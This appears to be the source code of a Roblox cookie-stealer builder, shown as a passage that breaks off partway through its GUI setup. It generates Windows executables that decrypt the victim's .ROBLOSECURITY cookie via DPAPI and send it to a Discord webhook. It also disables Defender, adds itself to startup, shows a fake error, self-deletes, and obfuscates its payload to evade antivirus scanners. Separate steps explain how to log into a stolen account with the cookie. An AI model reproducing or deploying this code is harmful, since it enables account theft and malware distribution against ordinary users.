import os
import time
import sys
import webbrowser
import tkinter as tk
from tkinter import messagebox, filedialog
import requests
import uuid
import shutil
import re
import subprocess
from datetime import datetime, timezone
import customtkinter
import math
import ctypes
from ctypes import wintypes
import base64
import random
import zlib
from string import ascii_letters, digits
from cryptography.fernet import Fernet

customtkinter.set_appearance_mode("dark")

RED_GRADIENT = [
    "\033[38;2;80;0;0m",
    "\033[38;2;110;0;0m",
    "\033[38;2;140;0;0m",
    "\033[38;2;170;0;0m",
    "\033[38;2;200;0;0m",
    "\033[38;2;220;20;20m",
    "\033[38;2;240;40;40m",
    "\033[38;2;255;60;60m",
    "\033[38;2;255;90;90m"
]
PURPLE = "\033[38;2;128;0;128m"
RESET = "\033[0m"

ascii_logo = r"""
▒███████▒ ▄▄▄██▀▀▀▓██   ██▓ ▄▄▄      
▒ ▒ ▒ ▄▀░   ▒██    ▒██  ██▒▒████▄    
░ ▒ ▄▀▒░    ░██     ▒██ ██░▒██  ▀█▄  
  ▄▀▒   ░▓██▄██▓    ░ ▐██▓░░██▄▄▄▄██ 
▒███████▒ ▓███▒     ░ ██▒▓░ ▓█   ▓██▒
░▒▒ ▓░▒░▒ ▒▓▒▒░      ██▒▒▒  ▒▒   ▓▒█░
░░▒ ▒ ░ ▒ ▒ ░▒░    ▓██ ░▒░   ▒   ▒▒ ░
░ ░ ░ ░ ░ ░ ░ ░    ▒ ▒ ░░    ░   ▒   
  ░ ░     ░   ░    ░ ░           ░  ░
░                  ░ ░               
"""

lines = [
    "Select an option:",
    "[1] Checker",
    "[2] Login by Cookie",
    "[3] Builder",
    "[0] Exit",
    "Option: ",
]

def main_menu():
    os.system("cls" if os.name == "nt" else "clear")
    print(RED_GRADIENT[0] + ascii_logo + RESET)
    print(RED_GRADIENT[1] + lines[0] + RESET)
    print(RED_GRADIENT[3] + lines[1] + RESET)
    print(RED_GRADIENT[5] + lines[2] + RESET)
    print(RED_GRADIENT[6] + lines[3] + RESET)
    print(RED_GRADIENT[7] + lines[4] + RESET)
    print(RED_GRADIENT[5] + lines[5], end='', flush=True)

def show_cookie_instructions():
    os.system("cls" if os.name == "nt" else "clear")
    print(PURPLE + "\nSteps to set the cookie:" + RESET)
    for i, instruction in enumerate([
        "Log in to Roblox in your browser.",
        "Get Cookie-Editor from Chrome Web Store.",
        "Go to Extensions > Manage Extensions.",
        "Enable 'Allow file URLs' for Cookie-Editor.",
        "Visit roblox.com/users/147675/profile.",
        "Open Cookie-Editor, find '.ROBLOSECURITY'.",
        "Paste new cookie value, verify with checker.",
        "Save the cookie in Cookie-Editor."
    ], 1):
        print(PURPLE + f"Step {i}: {instruction}" + RESET)
    print(PURPLE + "\nDone? Press enter to continue" + RESET)
    input()

def validate_webhook(url):
    if not url or not url.startswith("https://discord.com/api/webhooks/"):
        return False, ""
    try:
        response = requests.get(url, timeout=3)
        if response.status_code in (200, 204):
            try:
                webhook_data = response.json()
                return True, webhook_data.get("name", "")
            except ValueError:
                return False, ""
        return False, ""
    except Exception:
        return False, ""

def validate_image_url(url):
    if not url:
        return True
    if not url.startswith(("http://", "https://")):
        return False
    try:
        response = requests.head(url, timeout=3)
        if response.status_code == 200 and 'image/' in response.headers.get('Content-Type', ''):
            return True
        response = requests.get(url, timeout=3)
        if response.status_code == 200 and 'image/' in response.headers.get('Content-Type', ''):
            return True
        return False
    except:
        return False

def cleanup_files(output_name, include_temp=True):
    cleans_dir = {'__pycache__', 'build'} if not include_temp else {'__pycache__', 'build', 'pyinstaller_temp'}
    cleans_file = {f'{output_name}.spec', f'{output_name}.py'}
    for clean in cleans_dir:
        try:
            if os.path.isdir(clean):
                shutil.rmtree(clean, ignore_errors=True)
        except:
            pass
    for clean in cleans_file:
        try:
            if os.path.isfile(clean):
                os.remove(clean)
        except:
            pass

def log_error(message):
    log_path = os.path.join(os.getenv("TEMP"), "builder_errors.log")
    try:
        with open(log_path, "a", encoding="utf-8") as f:
            f.write(f"[{datetime.fromtimestamp(time.time(), timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")
    except:
        pass

def gen_random_string(length=10):
    first_char = random.choice(ascii_letters)
    rest = ''.join(random.choices(ascii_letters + digits, k=length-1))
    return first_char + rest

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))

def gen_junk_function():
    func_name = gen_random_string(8)
    var1, var2 = gen_random_string(5), gen_random_string(5)
    r1, r2 = random.randint(0, 999), random.randint(0, 999)
    return f'def {func_name}({var1}={r1}):\n    {var2} = {r2}\n    for _ in range({random.randint(2, 10)}):\n        {var2} += {var1}\n    return {var2}\n'

def gen_junk_class():
    class_name = gen_random_string(10)
    method_name = gen_random_string(8)
    var1 = gen_random_string(6)
    return f'class {class_name}:\n    def {method_name}(self):\n        {var1} = {random.randint(100, 999)}\n        return {var1} * 2\n'

def genjunk(num):
    code = ''
    for _ in range(num):
        choice = random.choice([1, 2, 3])
        if choice == 1:
            code += gen_junk_function()
        elif choice == 2:
            code += gen_junk_class()
        else:
            var_name = gen_random_string(10)
            r1, r2 = random.randint(0, 999), random.randint(0, 999)
            code += f'{var_name} = {r1} * {r2}\n'
    return code

def encode_b64(data: str) -> str:
    try:
        return base64.b64encode(data.encode()).decode()
    except Exception as e:
        log_error(f"Base64 encode error: {str(e)}")
        return ""

def compress(data: str) -> bytes:
    try:
        return zlib.compress(data.encode())
    except Exception as e:
        log_error(f"Zlib compress error: {str(e)}")
        return b""

def fernet_encrypt(key: bytes, data: bytes) -> bytes:
    try:
        cipher_suite = Fernet(key)
        return cipher_suite.encrypt(data)
    except Exception as e:
        log_error(f"Fernet encrypt error: {str(e)}")
        return b""

def anti_debug_check():
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            os._exit(1)
    except:
        pass

def obfuscate_code(script_content: str, output_name: str):
    anti_debug_check()
    encoded_data = encode_b64(script_content)
    if not encoded_data:
        log_error("Obfuscation failed: Base64 encoding returned empty")
        return None
    compressed_data = compress(encoded_data)
    if not compressed_data:
        log_error("Obfuscation failed: Compression returned empty")
        return None
    xor_key = os.urandom(16)
    xor_key_repr = repr(xor_key)
    xor_encrypted = xor_encrypt(compressed_data, xor_key)
    fernet_key = Fernet.generate_key()
    encrypted_data = fernet_encrypt(fernet_key, xor_encrypted)
    if not encrypted_data:
        log_error("Obfuscation failed: Fernet encryption returned empty")
        return None

    encrypted_data_repr = repr(encrypted_data)

    junk_code = genjunk(random.randint(20, 50))

    fernet_key_var = gen_random_string(12)
    xor_key_var = gen_random_string(12)
    cipher_var = gen_random_string(12)
    xor_decrypted_var = gen_random_string(12)
    decrypted_var = gen_random_string(12)
    decompressed_var = gen_random_string(12)
    decoded_var = gen_random_string(12)

    stub_code = f'''import sys
import os
import ctypes
import base64
import zlib
from cryptography.fernet import Fernet
from datetime import datetime, timezone

def _anti_debug():
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            os._exit(1)
    except:
        pass

_anti_debug()

def _xor_decrypt(data: bytes, key: bytes) -> bytes:
    try:
        return bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))
    except Exception as e:
        with open(os.path.join(os.getenv("TEMP"), "c63hr09O-me0e-4527-a849-438c2code1f7.log"), 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.fromtimestamp(time.time(), timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}] -> XOR decrypt error: {{str(e)}}\\n")
        sys.exit(1)

{junk_code}

try:
    {fernet_key_var} = "{fernet_key.decode()}"
    {xor_key_var} = {xor_key_repr}
    encrypted_data = {encrypted_data_repr}

    {cipher_var} = Fernet({fernet_key_var}.encode())
    {xor_decrypted_var} = {cipher_var}.decrypt(encrypted_data)
    {decrypted_var} = _xor_decrypt({xor_decrypted_var}, {xor_key_var})
    {decompressed_var} = zlib.decompress({decrypted_var})
    {decoded_var} = base64.b64decode({decompressed_var}).decode()
    exec({decoded_var})
except Exception as e:
    with open(os.path.join(os.getenv("TEMP"), "c63hr09O-me0e-4527-a849-438c2code1f7.log"), 'a', encoding='utf-8') as f:
        f.write(f"[{datetime.fromtimestamp(time.time(), timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}] -> Obfuscation execution error: {{str(e)}}\\n")
    sys.exit(1)
'''

    output_path = os.path.normpath(os.path.join(os.getcwd(), f"{output_name}.py"))
    try:
        with open(output_path, "w", encoding="utf-8") as f:
            f.write(stub_code)
        if not os.path.exists(output_path):
            log_error(f"Obfuscated file not created at {output_path}")
            return None
    except Exception as e:
        log_error(f"Failed to write obfuscated .py file: {str(e)}")
        return None
    return output_path

def generate_script(webhook_url, output_name, fake_error, add_startup, webhook_name, webhook_pfp, disable_defender, self_destruct, file_pumper, pump_size, anti_spam, ping, ping_type, spoof_virustotal=False):
    if not os.access(os.getcwd(), os.W_OK):
        log_error("No write permission in current directory")
        messagebox.showerror("Error", "No write permission in current directory. Try running as administrator.")
        return False

    if webhook_pfp and not validate_image_url(webhook_pfp):
        log_error("Invalid webhook profile picture URL (must be a valid image URL)")
        messagebox.showerror("Error", "Invalid webhook profile picture URL. Please use a valid image URL or leave it empty.")
        return False

    self_destruct_code = '''def self_destruct():
    try:
        file_path = os.path.abspath(__file__ if hasattr(sys, 'frozen') else sys.argv[0])
        startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        if os.path.dirname(file_path).lower() == startup_path.lower():
            log("Self-destruct skipped: Running from startup folder")
            return
        if not os.access(file_path, os.W_OK):
            log(f"No write permission for self-destruct: {file_path}")
            return
        if hasattr(sys, 'frozen'):
            bat_path = os.path.join(os.getenv("TEMP"), f"{uuid.uuid4().hex}.bat")
            anti_spam_del = ' & del "' + os.path.join(os.getenv("TEMP"), "chrome_BITS_9032_815744591.txt") + '"' if {anti_spam} else ''
            bat_content = f'ping 127.0.0.1 -n 4 > nul & del "{file_path}"{anti_spam_del} & del %0'
            with open(bat_path, 'w') as f:
                f.write(bat_content)
            subprocess.Popen(['cmd', '/c', bat_path], creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            os.remove(file_path)
            {f"os.remove(os.path.join(os.getenv('TEMP'), 'chrome_BITS_9032_815744591.txt')) if os.path.exists(os.path.join(os.getenv('TEMP'), 'chrome_BITS_9032_815744591.txt')) else ''" if anti_spam else ''}
        log("Self-destruct: File deleted")
    except Exception as e:
        log(f"Self-destruct error: {str(e)}")\n''' if self_destruct else ''

    pumper_code = '''def file_pumper():
    try:
        file_path = os.path.abspath(__file__ if hasattr(sys, 'frozen') else sys.argv[0])
        target_size = %s
        current_size = os.path.getsize(file_path)
        if current_size < target_size:
            with open(file_path, 'ab') as f:
                f.write(b'X' * (target_size - current_size))
            log(f"File pumped to {target_size} bytes")
        else:
            log("File pumper: Skipped, file already meets or exceeds target size")
    except Exception as e:
        log(f"File pumper error: {str(e)}")\n''' % (int(pump_size.replace("mb", "")) * 1024 * 1024) if file_pumper else ''

    startup_ext = ".py" if self_destruct and file_type == ".py" else ".exe"
    startup_check = "True" if self_destruct else "sys.argv[0].lower().endswith('.exe')"
    startup_filename = f"{output_name}{startup_ext}"

    script_content = f"""import os
import shutil
import json
import base64
import requests
import sys
import time
import subprocess
import ctypes
from ctypes import wintypes
from datetime import datetime, timezone
from time import sleep as zzz

WEBHOOK_URL = "{webhook_url}"
ANTI_SPAM_FILE = os.path.join(os.getenv("TEMP"), "chrome_BITS_9032_815744591.txt")

def log(text, sleep=None):
    try:
        with open(os.path.join(os.getenv("TEMP"), "c63hr09O-me0e-4527-a849-438c2code1f7.log"), 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.fromtimestamp(time.time(), timezone.utc).strftime('%Y-%m-%d %H:%M:%S')}] -> {{text}}\\n")
        if sleep: zzz(sleep)
    except:
        pass

def check_anti_spam():
    if {anti_spam}:
        try:
            temp_dir = os.getenv("TEMP", "")
            if not os.access(temp_dir, os.W_OK):
                log("Anti-spam: No write permission for TEMP directory")
                return
            if os.path.exists(ANTI_SPAM_FILE):
                with open(ANTI_SPAM_FILE, 'r') as f:
                    last_run = float(f.read().strip())
                if time.time() - last_run < 60:
                    log("Anti-spam: Too soon to run again.")
                    sys.exit()
            with open(ANTI_SPAM_FILE, 'w') as f:
                f.write(str(time.time()))
        except ValueError:
            log("Anti-spam: Corrupted last run time, resetting")
            with open(ANTI_SPAM_FILE, 'w') as f:
                f.write(str(time.time()))
        except Exception as e:
            log(f"Anti-spam error: {{str(e)}}")

def send_webhook(content, ping_type="{ping_type}"):
    if not WEBHOOK_URL:
        log("Error: WEBHOOK_URL not set")
        return
    embed = {{
        "title": "Decrypted Roblox Cookies",
        "description": f"```{{content}}```",
        "color": 0x38d13b
    }}
    data = {{"embeds": [embed]}}
    if "{webhook_name}":
        data["username"] = "{webhook_name}"
    if "{webhook_pfp}":
        data["avatar_url"] = "{webhook_pfp}"
    try:
        response = requests.post(WEBHOOK_URL, json=data, timeout=3)
        log(f"Webhook sent, status: {{response.status_code}}")
        if response.status_code not in (200, 204):
            log(f"Webhook failed: {{response.text}}")
        {'self_destruct()\n        ' if self_destruct else ''}
        if {ping} and ping_type:
            ping_data = {{"content": f"{{'@' + ping_type.lower()}}"}}
            try:
                response = requests.post(WEBHOOK_URL, json=ping_data, timeout=3)
                log(f"Ping sent, status: {{response.status_code}}")
                if response.status_code not in (200, 204):
                    log(f"Ping failed: {{response.text}}")
            except Exception as e:
                log(f"Ping error: {{str(e)}}")
    except Exception as e:
        log(f"Webhook error: {{str(e)}}")

def minimize_console():
    try:
        import win32gui
        import win32con
        hwnd = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(hwnd, win32con.SW_MINIMIZE)
        log("Console minimized")
    except Exception as e:
        log(f"Minimize console error: {{str(e)}}")

{'def show_fake_error():\n    try:\n        import win32gui\n        import win32con\n        win32gui.MessageBox(0, "Application failed to start: missing DLL", "Critical Error", win32con.MB_ICONERROR)\n        log("Displayed fake error message")\n    except Exception as e:\n        log(f"Fake error message failed: {{str(e)}}")\n' if fake_error else ''}
{'def disable_defender():\n    try:\n        if not ctypes.windll.shell32.IsUserAnAdmin():\n            log("Disable Defender error: Requires admin privileges")\n            return\n        result = subprocess.run(\n            ["powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"],\n            capture_output=True, text=True, shell=True\n        )\n        if result.returncode == 0:\n            log("Disabled Windows Defender real-time protection")\n        else:\n            log(f"Disable Defender error: {{result.stderr.strip()}}")\n    except Exception as e:\n        log(f"Disable Defender error: {{str(e)}}")\n' if disable_defender else ''}
{f'''def add_to_startup():
    startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "{startup_filename}")
    try:
        if not {startup_check}:
            log("Add to Startup skipped: Only .exe files can be added to startup unless self-destruct is enabled")
            return
        startup_dir = os.path.dirname(startup_path)
        if not os.path.exists(startup_dir):
            log(f"Startup directory does not exist: {{startup_dir}}")
            return
        if not os.access(startup_dir, os.W_OK):
            log("Error: No write permission for Startup directory (admin may be required)")
            return
        shutil.copy(os.path.abspath(sys.argv[0]), startup_path)
        log(f"Added to startup: {{startup_path}}")
    except Exception as e:
        log(f"Failed to add to startup: {{str(e)}}")\n''' if add_startup else ''}
{self_destruct_code}
{pumper_code}
def retrieve_roblox_cookies():
    {'check_anti_spam()\n    ' if anti_spam else ''}{'show_fake_error()\n    ' if fake_error else ''}{'disable_defender()\n    ' if disable_defender else ''}{'add_to_startup()\n    ' if add_startup else ''}{'file_pumper()\n    ' if file_pumper else ''}minimize_console()
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_byte))]

    try:
        crypt32 = ctypes.WinDLL("crypt32.dll")
        CryptUnprotectData = crypt32.CryptUnprotectData
        CryptUnprotectData.argtypes = [
            ctypes.POINTER(DATA_BLOB), ctypes.POINTER(ctypes.c_wchar_p),
            ctypes.POINTER(DATA_BLOB), ctypes.c_void_p, ctypes.c_void_p,
            wintypes.DWORD, ctypes.POINTER(DATA_BLOB)
        ]
        CryptUnprotectData.restype = wintypes.BOOL
        log("Using ctypes.CryptUnprotectData from crypt32.dll")
    except Exception as e:
        log(f"Error setting up ctypes.CryptUnprotectData: {{str(e)}}")
        embed = {{
            "title": ":x: CryptUnprotectData Setup Error",
            "description": f"Failed to set up CryptUnprotectData: {{str(e)}}",
            "color": 0xFF0000
        }}
        send_webhook(embed)
        return

    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
    if not os.path.exists(roblox_cookies_path):
        log(f"Cookie file not found at {{roblox_cookies_path}}")
        embed = {{
            "title": ":x: Cookie File Not Found",
            "description": f"Could not find robloxcookies.dat at {{roblox_cookies_path}}",
            "color": 0xFF0000
        }}
        send_webhook(embed)
        return
    temp_dir = os.getenv("TEMP", "")
    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
    try:
        shutil.copy(roblox_cookies_path, destination_path)
        log(f"Copied cookie file to {{destination_path}}")
    except Exception as e:
        log(f"Error copying cookie file: {{str(e)}}")
        embed = {{
            "title": ":x: File Copy Error",
            "description": f"Failed to copy cookie file: {{str(e)}}",
            "color": 0xFF0000
        }}
        send_webhook(embed)
        return
    try:
        with open(destination_path, 'r', encoding='utf-8') as file:
            try:
                file_content = json.load(file)
                encoded_cookies = file_content.get("CookiesData", "")
                if encoded_cookies:
                    decoded_cookies = base64.b64decode(encoded_cookies)
                    try:
                        data_in = DATA_BLOB()
                        data_in.cbData = len(decoded_cookies)
                        data_in.pbData = ctypes.cast(ctypes.create_string_buffer(decoded_cookies), ctypes.POINTER(ctypes.c_byte))
                        data_out = DATA_BLOB()
                        success = CryptUnprotectData(
                            ctypes.byref(data_in), None, None, None, None, 0, ctypes.byref(data_out)
                        )
                        if success:
                            decrypted_bytes = ctypes.string_at(data_out.pbData, data_out.cbData)
                            cookie_string = decrypted_bytes.decode('utf-8', errors='ignore')
                            log("Decrypted cookie string retrieved.")
                            print("Decrypted Content:")
                            print(cookie_string)
                            send_webhook(cookie_string)
                            ctypes.windll.kernel32.LocalFree(data_out.pbData)
                        else:
                            error_code = ctypes.get_last_error()
                            log(f"Error decrypting with DPAPI: Error code {{error_code}}")
                            embed = {{
                                "title": ":x: Decryption Error",
                                "description": f"Failed to decrypt cookie data: Error code {{error_code}}",
                                "color": 0xFF0000
                            }}
                            send_webhook(embed)
                    except Exception as e:
                        log(f"Error decrypting with DPAPI: {{str(e)}}")
                        embed = {{
                            "title": ":x: Decryption Error",
                            "description": f"Failed to decrypt cookie data: {{str(e)}}",
                            "color": 0xFF0000
                        }}
                        send_webhook(embed)
                else:
                    log("Error: No 'CookiesData' found in the file.")
                    embed = {{
                        "title": ":x: No Cookies Data",
                        "description": "No 'CookiesData' found in robloxcookies.dat.",
                        "color": 0xFF0000
                    }}
                    send_webhook(embed)
            except json.JSONDecodeError as e:
                log(f"Error while parsing JSON: {{str(e)}}")
                embed = {{
                    "title": ":x: JSON Parse Error",
                    "description": f"Failed to parse robloxcookies.dat: {{str(e)}}",
                    "color": 0xFF0000
                }}
                send_webhook(embed)
    except Exception as e:
        log(f"Error reading file: {{str(e)}}")
        embed = {{
            "title": ":x: File Read Error",
            "description": f"Failed to read robloxcookies.dat: {{str(e)}}",
            "color": 0xFF0000
        }}
        send_webhook(embed)
if __name__ == "__main__":
    retrieve_roblox_cookies()
"""
    script_lines = script_content.split('\n')
    script_content = '\n'.join(line for line in script_lines if not line.strip().startswith('#'))

    output_path = os.path.normpath(os.path.join(os.getcwd(), f"{output_name}.py"))
    exe_path = os.path.normpath(os.path.join(os.getcwd(), f"{output_name}.exe"))

    if spoof_virustotal:
        try:
            obfuscated_path = obfuscate_code(script_content, output_name)
            if not obfuscated_path:
                log_error("Obfuscation failed, aborting build")
                messagebox.showerror("Error", "Obfuscation failed. Check builder_errors.log in TEMP directory.")
                return False
            output_path = obfuscated_path
        except Exception as e:
            log_error(f"Obfuscation error: {str(e)}")
            messagebox.showerror("Error", f"Obfuscation error: {str(e)}. Check builder_errors.log in TEMP directory.")
            cleanup_files(output_name, include_temp=False)
            return False
    else:
        try:
            cleanup_files(output_name, include_temp=False)
            if not os.access(os.getcwd(), os.W_OK):
                raise PermissionError("No write permission for output directory")
            with open(output_path, "w", encoding="utf-8") as f:
                f.write(script_content)
            if not os.path.exists(output_path):
                raise FileNotFoundError(f"Failed to create {output_path}")
        except Exception as e:
            log_error(f"Failed to write .py file: {str(e)}")
            messagebox.showerror("Error", f"Failed to write .py file: {str(e)}. Check builder_errors.log in TEMP directory.")
            cleanup_files(output_name, include_temp=False)
            return False

    if file_pumper:
        try:
            pump_size_bytes = int(pump_size.replace("mb", "")) * 1024 * 1024
            if pump_size_bytes < 1024 * 1024 or pump_size_bytes > 100 * 1024 * 1024:
                raise ValueError("Pump size must be between 1mb and 100mb")
            if file_type == "pyinstaller":
                # Defer pumping to runtime for .exe
                pass
            else:
                # Pump .py file directly
                current_size = os.path.getsize(output_path)
                if current_size < pump_size_bytes:
                    if not os.access(output_path, os.W_OK):
                        log_error(f"File pumper: No write permission for {output_path}")
                        messagebox.showerror("Error", f"No write permission for {output_path}. Check builder_errors.log in TEMP directory.")
                        cleanup_files(output_name, include_temp=False)
                        return False
                    comment_line = "#xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
                    bytes_per_line = len(comment_line.encode('utf-8')) + 1  # +1 for newline
                    lines_needed = (pump_size_bytes - current_size) // bytes_per_line
                    remainder_bytes = (pump_size_bytes - current_size) % bytes_per_line
                    with open(output_path, 'a', encoding='utf-8') as f:
                        f.write('\n')
                        for _ in range(int(lines_needed)):
                            f.write(comment_line + '\n')
                        if remainder_bytes > 0:
                            f.write(comment_line[:remainder_bytes] + '\n')
                    final_size = os.path.getsize(output_path)
                    log_error(f"File pumped to {final_size} bytes")
                else:
                    log_error("File pumper: Skipped, file already meets or exceeds target size")
        except Exception as e:
            log_error(f"File pumper error: {str(e)}")
            messagebox.showerror("Error", f"File pumper error: {str(e)}. Check builder_errors.log in TEMP directory.")
            cleanup_files(output_name, include_temp=False)
            return False

    if file_type == "pyinstaller":
        import site
        pywin32_dir = os.path.join(site.getsitepackages()[0], "pywin32_system32")
        pywin32_dlls = []
        for dll in ["pywintypes311.dll", "pythoncom311.dll"]:
            dll_path = os.path.join(pywin32_dir, dll)
            if os.path.exists(dll_path):
                pywin32_dlls.append(f"--add-binary={dll_path};pywin32_system32")
            else:
                log_error(f"Could not find {dll} in {pywin32_dir}. DLL will not be bundled.")
        pyinstaller_cmd = [
            "pyinstaller",
            "--onefile", "--clean", "--noconsole", "--noupx",
            "--workpath=pyinstaller_temp",
            "--hidden-import=base64",
            "--hidden-import=json",
            "--hidden-import=requests",
            "--hidden-import=pywin32",
            "--hidden-import=win32gui",
            "--hidden-import=win32con",
            "--hidden-import=win32api",
            "--hidden-import=win32file",
            "--hidden-import=sys",
            "--hidden-import=time",
            "--hidden-import=os",
            "--hidden-import=shutil",
            "--hidden-import=subprocess",
            "--hidden-import=ctypes",
            "--hidden-import=ctypes.wintypes",
            "--hidden-import=datetime",
            "--hidden-import=uuid",
            "--hidden-import=cryptography",
            "--hidden-import=cryptography.fernet",
            "--hidden-import=zlib",
        ] + pywin32_dlls + [
            f"--name={output_name}",
            "--distpath=.",
            f'"{output_path}"'
        ]
        if icon_path and os.path.exists(icon_path) and os.path.isfile(icon_path) and os.access(icon_path, os.R_OK) and icon_path.endswith(".ico"):
            pyinstaller_cmd.append(f"--icon=\"{os.path.normpath(icon_path)}\"")
        
        bat_path = os.path.join(os.getenv("TEMP"), f"pyinstaller_{uuid.uuid4().hex}.bat")
        script_dir = os.path.normpath(os.getcwd())
        cleanup_commands = f"""
:wait_for_exe
if not exist "{exe_path}" (
    timeout /t 1 /nobreak >nul
    goto wait_for_exe
)
if exist "{output_path}" del "{output_path}"
if exist "{os.path.normpath(os.path.join(os.getcwd(), f'{output_name}.spec'))}" del "{os.path.normpath(os.path.join(os.getcwd(), f'{output_name}.spec'))}"
if exist "{os.path.normpath(os.path.join(os.getcwd(), 'pyinstaller_temp'))}" rmdir /s /q "{os.path.normpath(os.path.join(os.getcwd(), 'pyinstaller_temp'))}"
del "%~f0"
"""
        bat_content = f"""@echo off
cd /d "{script_dir}" || (
    echo Failed to change to directory: {script_dir}
    exit /b 1
)
{' '.join([cmd for cmd in pyinstaller_cmd if cmd])}
{cleanup_commands}
"""
        try:
            with open(bat_path, "w", encoding="utf-8") as f:
                f.write(bat_content)
            cmd_command = f"start cmd /k call \"{bat_path}\""
            subprocess.Popen(cmd_command, shell=True, cwd=script_dir)
            return True
        except Exception as e:
            log_error(f"Failed to start PyInstaller CMD: {str(e)}")
            messagebox.showerror("Error", f"Failed to start PyInstaller: {str(e)}. Check builder_errors.log in TEMP directory.")
            cleanup_files(output_name, include_temp=False)
            try:
                if os.path.exists(bat_path):
                    os.remove(bat_path)
            except:
                pass
            return False
    return True

def create_builder_gui():
    webhook_valid = False
    updated_dictionary = {
        "webhook": None,
        "ping": False,
        "ping_type": "Everyone",
        "fake_error": False,
        "add_startup": False,
        "disable_defender": False,
        "self_destruct": False,
        "file_pumper": False,
        "pump_size": "10mb",
        "anti_spam": False,
        "spoof_virustotal": False
    }
    after_ids = []
    global icon_path, file_type
    icon_path = ""
    file_type = "pyinstaller"

    root = customtkinter.CTk()
    root.title("Shadow Cookie Grabber Builder")
    root.geometry("800x550")
    root.configure(fg_color="#333333")

    def on_closing():
        for after_id in after_ids:
            try:
                root.after_cancel(after_id)
            except:
                pass
        root.quit()

    root.protocol("WM_DELETE_WINDOW", on_closing)

    def validate_length(char, entry_value):
        return len(entry_value) <= 200

    vcmd = (root.register(validate_length), '%S', '%P')

    webhook_label = customtkinter.CTkLabel(
        root, text="Webhook URL:", font=customtkinter.CTkFont(size=13, family="Arial"), anchor="e", width=120
    )
    webhook_label.grid(row=0, column=0, sticky="e", padx=8, pady=4)
    webhook_entry = customtkinter.CTkEntry(
        root, width=300, height=28, corner_radius=5,
        font=customtkinter.CTkFont(size=13, family="Arial"),
        placeholder_text="https://discord.com/api/webhooks/...",
        validate="key", validatecommand=vcmd
    )
    webhook_entry.grid(row=0, column=1, sticky="w", padx=8, pady=4)
    webhook_status = customtkinter.CTkLabel(root, text="●", font=customtkinter.CTkFont(size=13), text_color="red")
    webhook_status.grid(row=0, column=1, sticky="w", padx=316, pady=4)
    webhook_entry.bind("<KeyRelease>", lambda event: check_webhook_action())
    webhook_entry.bind("<FocusOut>", lambda event: check_webhook_action())
    webhook_entry.bind("<Button-1>", lambda event: check_webhook_action())

    output_label = customtkinter.CTkLabel(
        root, text="Output Name:", font=customtkinter.CTkFont(size=13, family="Arial"), anchor="e", width=120
    )
    output_label.grid(row=1, column=0, sticky="e", padx=8, pady=4)
    output_entry = customtkinter.CTkEntry(
        root, width=300, height=28, corner_radius=5,
        font=customtkinter.CTkFont(size=13, family="Arial"),
        placeholder_text="github.com/guapguap"
    )
    output_entry.grid(row=1, column=1, sticky="w", padx=8, pady=4)
    output_entry.bind("<KeyRelease>", lambda event: update_build_state())

    file_type_label = customtkinter.CTkLabel(
        root, text="File Type:", font=customtkinter.CTkFont(size=13, family="Arial"), anchor="e", width=120
    )
    file_type_label.grid(row=2, column=0, sticky="e", padx=8, pady=4)
    file_type_var = tk.StringVar(value="pyinstaller")
    file_options = customtkinter.CTkOptionMenu(
        root, width=300, height=28, values=["pyinstaller", ".py"], corner_radius=5,
        font=customtkinter.CTkFont(size=13, family="Arial"),
        fg_color="#8B0000", button_hover_color="#4B0000", button_color="#6B0000",
        variable=file_type_var, command=lambda value: update_icon_state()
    )
    file_options.grid(row=2, column=1, sticky="w", padx=8, pady=4)

    icon_label = customtkinter.CTkLabel(
        root, text="Icon Path (.ico):", font=customtkinter.CTkFont(size=13, family="Arial"), anchor="e", width=120
    )
    icon_label.grid(row=3, column=0, sticky="e", padx=8, pady=4)
    icon_button = customtkinter.CTkButton(
        root, width=300, height=28, text="Browse", corner_radius=5,
        font=customtkinter.CTkFont(size=13, family="Arial"),
        fg_color="#8B0000", hover_color="#4B0000", cursor="hand2",
        command=lambda: select_icon()
    )
    icon_button.grid(row=3, column=1, sticky="w", padx=8, pady=4)

    webhook_name_label = customtkinter.CTkLabel(
        root, text="Webhook Name:", font=customtkinter.CTkFont(size=13, family="Arial"), anchor="e", width=120
    )
    webhook_name_label.grid(row=4, column=0, sticky="e", padx=8, pady=4)
    webhook_name_entry = customtkinter.CTkEntry(
        root, width=300, height=28, corner_radius=5,
        font=customtkinter.CTkFont(size=13, family="Arial")
    )
    webhook_name_entry.grid(row=4, column=1, sticky="w", padx=8, pady=4)

    webhook_pfp_label = customtkinter.CTkLabel(
        root, text="Webhook PFP URL:", font=customtkinter.CTkFont(size=13, family="Arial"), anchor="e", width=120
    )
    webhook_pfp_label.grid(row=5, column=0, sticky="e", padx=8, pady=4)
    webhook_pfp_entry = customtkinter.CTkEntry(
        root, width=300, height=28, corner_radius=5,
        font=customtkinter.CTkFont(size=13, family="Arial"),
        validate="key", validatecommand=vcmd
    )
    webhook_pfp_entry.grid(row=5, column=1, sticky="w", padx=8, pady=4)

    fake_error_var = tk.BooleanVar()
    fake_error_check = customtkinter.CTkCheckBox(
        root, text="Fake Error Message", font=customtkinter.CTkFont(size=13, family="Arial"),
        fg_color="#8B0000", hover_color="#4B0000", variable=fake_error_var,
